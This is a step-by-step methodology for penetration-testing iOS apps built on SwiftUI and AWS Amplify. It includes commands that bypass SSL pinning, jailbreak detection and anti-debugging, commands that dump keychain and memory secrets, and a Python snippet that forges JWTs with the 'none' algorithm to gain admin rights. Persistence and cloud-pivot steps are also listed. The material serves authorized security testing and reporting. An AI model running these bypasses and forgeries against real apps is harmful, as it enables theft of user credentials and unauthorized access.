# iOS Penetration Testing Methodology
## SwiftUI + AWS Amplify Applications

### Pre-Assessment Setup

#### Environment Requirements
- Jailbroken iOS device (checkra1n/unc0ver) or Corellium instance
- Burp Suite Pro with SSL certificates installed
- Frida server running on device
- MobSF Docker container running
- AWS CLI configured with test credentials

#### Tool Installation
```bash
# On testing machine
pip3 install frida-tools objection
brew install libimobiledevice ideviceinstaller

# On iOS device
apt-get install frida-server
ldid -S /usr/sbin/frida-server
```

---

## Phase 1: Static Analysis (Day 1)

### 1.1 Binary Extraction
```bash
# Extract IPA from device
frida-ps -Uai  # Get app identifier
ipainstaller -l  # List installed apps
ipainstaller -a com.target.app -o target.ipa

# Or from App Store
ipatool download --bundle-id com.target.app
```

### 1.2 Binary Analysis
```bash
# Use custom analyzer
python3 tools/scripts/ios_binary_analyzer.py target.ipa

# Manual analysis
unzip target.ipa
cd Payload/*.app
otool -L AppBinary  # Check libraries
otool -l AppBinary | grep crypt  # Check encryption
strings AppBinary | grep -E "http|api|aws|key|secret"
```

### 1.3 AWS Amplify Configuration
Look for:
- `aws-exports.js`
- `amplifyconfiguration.json`
- GraphQL schemas
- Cognito pool IDs
- S3 bucket names

### 1.4 MobSF Scanning
```bash
# Upload to MobSF
curl -F 'file=@target.ipa' http://localhost:8000/api/v1/upload -H "Authorization: API_KEY"
```

---

## Phase 2: Dynamic Analysis (Day 2)

### 2.1 SSL Pinning Bypass
```bash
# Using universal bypass
frida -U -f com.target.app -l defensive-bypass/ssl-pinning/universal_ssl_bypass.js --no-pause

# Or with objection
objection -g com.target.app explore
ios sslpinning disable
```

### 2.2 Anti-Debug Bypass
```bash
python3 defensive-bypass/anti-debug/anti_debug_bypass.py com.target.app --spawn
```

### 2.3 Jailbreak Detection Bypass
```bash
frida -U -f com.target.app -l defensive-bypass/jailbreak/jb_detection_bypass.js --no-pause
```

### 2.4 Runtime Analysis
```bash
# With objection
ios hooking list classes  # List all classes
ios hooking search methods "*password*"
ios hooking watch method "-[LoginViewController authenticate]" --dump-args

# Monitor file access
ios monitor file

# Dump keychain
ios keychain dump
```

### 2.5 Memory Analysis
```bash
# Dump memory
frida-dump -U -n AppName -o memory.dump

# Search for sensitive data
strings memory.dump | grep -E "password|token|secret"
```

---

## Phase 3: Network Analysis (Day 2-3)

### 3.1 Proxy Configuration
```bash
# Configure iOS proxy to Burp
# Install Burp CA certificate
# Settings > General > About > Certificate Trust Settings
```

### 3.2 API Enumeration
- Capture all API calls
- Document endpoints
- Map GraphQL queries/mutations
- Identify authentication flow

### 3.3 AWS Amplify Testing
```bash
# GraphQL fuzzing
go run tools/scripts/amplify_api_fuzzer.go \
  -endpoint https://api.target.com/graphql \
  -token "JWT_TOKEN" \
  -all

# Test Cognito
aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id CLIENT_ID \
  --auth-parameters USERNAME=test,PASSWORD=test
```

---

## Phase 4: Vulnerability Testing (Day 3-4)

### 4.1 Authentication & Authorization
- [ ] Test token expiration
- [ ] JWT manipulation (none algorithm, signature bypass)
- [ ] Session fixation
- [ ] Privilege escalation
- [ ] Multi-factor bypass

### 4.2 Input Validation
- [ ] SQL injection in GraphQL
- [ ] XSS in SwiftUI text inputs
- [ ] Command injection
- [ ] Path traversal
- [ ] XXE injection

### 4.3 Business Logic
- [ ] Race conditions
- [ ] IDOR vulnerabilities
- [ ] Price manipulation
- [ ] Workflow bypass

### 4.4 iOS Specific
- [ ] URL scheme hijacking
- [ ] Pasteboard leakage
- [ ] Screenshot caching
- [ ] Background snapshot
- [ ] Biometric bypass

### 4.5 AWS Specific
- [ ] S3 bucket enumeration
- [ ] Cognito user enumeration
- [ ] Lambda function exposure
- [ ] DynamoDB injection
- [ ] IAM privilege escalation

---

## Phase 5: Exploitation (Day 4-5)

### 5.1 Exploit Development
```python
# Example: JWT token forger
import jwt
import json

# Decode without verification
token = "eyJ..."
decoded = jwt.decode(token, options={"verify_signature": False})

# Modify claims
decoded['role'] = 'admin'
decoded['exp'] = 9999999999

# Re-sign with 'none' algorithm
forged = jwt.encode(decoded, '', algorithm='none')
```

### 5.2 Chaining Vulnerabilities
Document attack chains:
1. SSL pinning bypass → API access
2. Token manipulation → Privilege escalation
3. IDOR → Data exfiltration

---

## Phase 6: Post-Exploitation (Day 5)

### 6.1 Data Extraction
```bash
# Export sensitive data
ios plist cat com.target.app.plist
ios nsuserdefaults get
ios cookies get
```

### 6.2 Persistence
- Install malicious profiles
- Modify app preferences
- Backdoor authentication

### 6.3 Lateral Movement
- Access other AWS services
- Enumerate related applications
- Cloud pivot techniques

---

## Reporting Template

### Executive Summary
- Application overview
- Testing scope
- Key findings
- Business impact

### Technical Findings
For each vulnerability:
1. **Title**: Clear vulnerability name
2. **Severity**: Critical/High/Medium/Low
3. **CVSS Score**: Base score calculation
4. **Description**: Technical details
5. **Impact**: Business consequences
6. **Proof of Concept**: Step-by-step reproduction
7. **Remediation**: Specific fixes
8. **References**: OWASP, CVE links

### Risk Matrix
| Finding | Severity | Likelihood | Risk |
|---------|----------|------------|------|
| SQL Injection | Critical | High | Critical |
| Weak Crypto | High | Medium | High |
| Info Disclosure | Medium | High | Medium |

### Recommendations
1. **Immediate**: Critical fixes
2. **Short-term**: High priority items
3. **Long-term**: Architecture improvements

---

## Automation Scripts

### Quick Assessment
```bash
#!/bin/bash
# quick_assess.sh

APP_ID=$1
IPA_FILE=$2

echo "[*] Starting iOS assessment for $APP_ID"

# Static analysis
python3 tools/scripts/ios_binary_analyzer.py $IPA_FILE

# Dynamic analysis
frida -U -f $APP_ID -l defensive-bypass/ssl-pinning/universal_ssl_bypass.js --no-pause &
sleep 5

# API fuzzing
objection -g $APP_ID explore -c "ios keychain dump"

echo "[+] Quick assessment complete"
```

### Continuous Monitoring
```python
# monitor.py
import frida
import sys

def on_message(message, data):
    if message['type'] == 'send':
        print(f"[*] {message['payload']}")

session = frida.get_usb_device().attach(sys.argv[1])
script = session.create_script(open('monitor.js').read())
script.on('message', on_message)
script.load()
sys.stdin.read()
```

---

## Checklist Summary

- [ ] Environment setup complete
- [ ] Static analysis performed
- [ ] Dynamic analysis executed
- [ ] Network traffic analyzed
- [ ] Vulnerabilities identified
- [ ] Exploits developed
- [ ] Report generated
- [ ] Remediation verified

---

## Additional Resources

- [OWASP Mobile Top 10 2024](https://owasp.org/www-project-mobile-top-10/)
- [iOS Security Guide](https://www.apple.com/business/docs/iOS_Security_Guide.pdf)
- [AWS Security Best Practices](https://aws.amazon.com/security/best-practices/)
- [Frida Documentation](https://frida.re/docs/)
- [Objection Wiki](https://github.com/sensepost/objection/wiki)